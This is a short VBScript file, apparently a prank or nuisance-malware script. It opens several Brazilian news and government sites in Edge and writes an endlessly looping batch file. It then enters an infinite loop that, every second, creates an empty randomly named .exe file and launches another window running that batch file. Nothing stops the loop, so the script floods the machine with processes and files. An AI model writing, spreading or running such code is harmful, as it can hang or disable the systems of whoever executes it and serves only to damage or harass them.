Dim objShell
Set objShell = CreateObject("WScript.Shell")

Dim websites
websites = Array( _
    "https://www.uol.com.br", _
    "https://www.globo.com", _
    "https://www.terra.com.br", _
    "https://www.r7.com", _
    "https://www.folha.uol.com.br", _
    "https://www.estadao.com.br", _
    "https://www.gov.br/imprensanacional/pt-br" _
)

Dim i
For i = 0 To UBound(websites)
    objShell.Run "msedge.exe " & websites(i)
    WScript.Sleep 1 ' wait 1 seconds between openings
Next

' Create a batch file
Dim objFSO, objFile
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile("loop.bat", True)

objFile.WriteLine("@echo off")
objFile.WriteLine(":start")
objFile.WriteLine("echo ffriytiihhhhhhhhh")
objFile.WriteLine("goto start")
objFile.Close

' Now add the random file creation loop
Dim folder, filename
folder = objFSO.GetAbsolutePathName(".")

Randomize
Do
    filename = folder & "\" & Int((999999 * Rnd) + 1) & ".exe"
    objFSO.CreateTextFile filename, True
   objShell.Run "loop.bat", 1, False
    WScript.Sleep 1000 ' wait 1 seconds
Loop
